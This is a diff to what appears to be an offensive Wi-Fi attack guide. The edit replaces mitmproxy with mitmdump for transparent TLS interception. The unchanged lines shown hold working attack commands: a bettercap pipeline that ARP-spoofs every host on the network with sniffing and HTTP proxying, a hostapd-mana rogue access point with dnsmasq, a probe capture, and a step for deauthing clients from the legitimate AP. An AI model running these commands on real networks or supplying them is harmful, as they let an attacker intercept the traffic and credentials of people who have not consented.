@@ -145,8 +145,7 @@ For high-fidelity portals, mirror the legitimate captive portal's HTML/CSS exact
 Once a client associates and you're their gateway:
 
 ```bash
-# Transparent TLS MITM (requires CA cert install on client OR clients with MITM-able apps)
-mitmproxy --mode transparent --showhost --ssl-insecure
+mitmdump --mode transparent --showhost --ssl-insecure
 
 # Bettercap full pipeline (sniff, ARP, DNS, JS injection)
 sudo bettercap -iface wlan0 -eval "set arp.spoof.targets *; arp.spoof on; net.sniff on; http.proxy on"
@@ -200,8 +199,9 @@ sudo airodump-ng wlan0mon -w probes
 sudo hostapd-mana /tmp/mana.conf
 sudo dnsmasq -C /tmp/dnsmasq.conf
 
-# 4. Captive portal / payload delivery / MITM
-mitmproxy --mode transparent --showhost --ssl-insecure
+# 4. Captive portal / payload delivery / MITM (mitmdump; transparent mode
+#    needs root + iptables)
+mitmdump --mode transparent --showhost --ssl-insecure
 
 # 5. Coerce specific clients if needed (deauth on legit AP)
 
